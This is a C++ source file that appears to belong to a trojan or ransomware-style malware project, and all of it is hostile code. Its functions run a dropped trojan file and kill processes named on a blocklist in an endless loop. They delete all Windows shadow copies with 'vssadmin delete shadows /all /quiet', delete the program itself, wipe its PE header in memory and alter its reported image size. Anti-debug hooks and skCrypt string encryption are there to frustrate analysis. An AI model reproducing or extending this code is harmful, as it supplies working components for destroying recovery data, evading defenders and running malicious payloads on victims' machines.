#include "headers.h"

using namespace std;


string GenerateRandom(const int len) {
    timeval time;
    GetTimeOfDay(&time, NULL);
    const string alphanum = (string)skCrypt("UHGAX5r9eVJsiDMqSCN6QEgoPpvcW2fkyzhBl048dajFbxmIwuOT7KLYZn31tR");  // = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" but scrambled for more security against reverse
    string result;
    result.reserve(len);
    srand((time.tv_sec * 2654435789U + time.tv_usec) * 2654435789U + _getpid());
    for (int i = 0; i < len; ++i)
        result += alphanum.at(rand() % (size(alphanum) - 1));

    return result;
}

DWORD TrojanFunction(LPVOID params) {
    this_thread::sleep_for(6500ms);
    if (DROPRUN_TROJAN_FILE)
        system((TROJANFILE).c_str());
    system(((string)skCrypt("start ") + (string)skCrypt("https://www.youtube.com/watch?v=dQw4w9WgXcQ")).c_str());   // just an example
}

void RemoveTaskByName(const wstring& processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return;

    PROCESSENTRY32W procEntry;
    procEntry.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnap, &procEntry)) {
        do {
            wstring currentProcessName = procEntry.szExeFile;
            if (currentProcessName == processName) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, procEntry.th32ProcessID);
                if (hProcess != NULL) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hSnap, &procEntry));
    }

    CloseHandle(hSnap);
}

void RemoveTasks() {
    while (true)
        for (const auto& processName : badPrograms)
            RemoveTaskByName(wstring(processName.begin(), processName.end()));
}

void DeleteRestorePoints() {
	system(skCrypt("vssadmin delete shadows /all /quiet"));
    // Automatically encoded during precompilation
}

void DeleteMe(const string& myPath) {
    system(((string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"")).c_str());
}

void PEHeaderDeleter() {
    char* baseAddr = (char*)GetModuleHandle(NULL);
    VirtualProtect(baseAddr, 4096, PAGE_READWRITE, new DWORD(0));
    SecureZeroMemory(baseAddr, 4096);
}

void ImageSizeIncreaser() {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY inLoadOrderModuleList = (PLIST_ENTRY)pPeb->Ldr->Reserved2[1];
    PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(inLoadOrderModuleList, LDR_DATA_TABLE_ENTRY, Reserved1[0]);
    PULONG pEntrySizeOfImage = (PULONG)&tableEntry->Reserved3[1];
    *pEntrySizeOfImage = (ULONG)((INT_PTR)tableEntry->DllBase + 0x100000);
}

BOOL WINAPI HookIsDebuggerPresent() {
    return FALSE;
}

bool AntiDebug() {
    if (IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL))
        return true;

    void* pOriginalIsDebuggerPresent = (void*)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "IsDebuggerPresent");
    void* pDetourIsDebuggerPresent = (void*)HookIsDebuggerPresent;
    MH_CreateHook(pOriginalIsDebuggerPresent, pDetourIsDebuggerPresent, (LPVOID*)&pOriginalIsDebuggerPresent);
    MH_EnableHook(pOriginalIsDebuggerPresent);

    ULONG heapInformation = HEAP_NO_SERIALIZE;
    HeapSetInformation(GetProcessHeap(), HeapCompatibilityInformation, &heapInformation, sizeof(heapInformation));

    return false;
}
